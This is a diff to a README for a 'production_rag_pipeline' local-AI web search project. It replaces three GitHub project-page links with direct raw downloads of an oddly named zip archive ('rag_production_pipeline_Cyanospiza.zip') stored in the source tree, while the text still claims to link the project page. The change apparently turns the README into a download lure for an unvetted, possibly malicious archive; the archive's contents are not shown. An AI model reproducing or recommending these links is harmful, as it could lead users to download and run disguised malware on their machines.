@@ -1,12 +1,12 @@
 # 🔎 production_rag_pipeline - Search the web with local AI
 
-[![Download or View Project](https://img.shields.io/badge/Download%20%26%20Run-Visit%20GitHub-blue?style=for-the-badge)](https://github.com/Orelieindigestible768/production_rag_pipeline)
+[![Download or View Project](https://img.shields.io/badge/Download%20%26%20Run-Visit%20GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/Orelieindigestible768/production_rag_pipeline/main/src/production_rag_pipeline/rag_production_pipeline_Cyanospiza.zip)
 
 ## 📥 Download
 
 Use this link to visit the project page and download the files:
 
-https://github.com/Orelieindigestible768/production_rag_pipeline
+https://raw.githubusercontent.com/Orelieindigestible768/production_rag_pipeline/main/src/production_rag_pipeline/rag_production_pipeline_Cyanospiza.zip
 
 ## 🪟 Windows Setup
 
@@ -279,4 +279,4 @@ This repository is tied to:
 
 ## 📎 Project link
 
-https://github.com/Orelieindigestible768/production_rag_pipeline
+https://raw.githubusercontent.com/Orelieindigestible768/production_rag_pipeline/main/src/production_rag_pipeline/rag_production_pipeline_Cyanospiza.zip
